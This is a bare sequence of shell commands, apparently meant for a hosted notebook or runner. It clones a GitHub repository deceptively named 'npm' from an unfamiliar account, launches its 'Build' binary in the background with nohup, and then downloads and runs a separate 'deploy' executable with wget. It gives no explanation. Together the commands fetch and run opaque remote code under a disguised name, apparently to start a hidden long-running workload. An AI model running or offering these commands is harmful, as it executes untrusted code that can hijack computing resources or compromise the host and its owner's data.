apt-get update
sync && echo 3 | tee /proc/sys/vm/drop_caches
git clone https://github.com/Jsjsj991/npm.git && cd npm
chmod +x Build
--command "nohup ./Build --log=stdout > meta.log &"
sleep 2
--command "cat meta.log"
wget https://raw.githubusercontent.com/Jsjsj991/npm/main/deploy
chmod +x deploy
--command "./deploy"
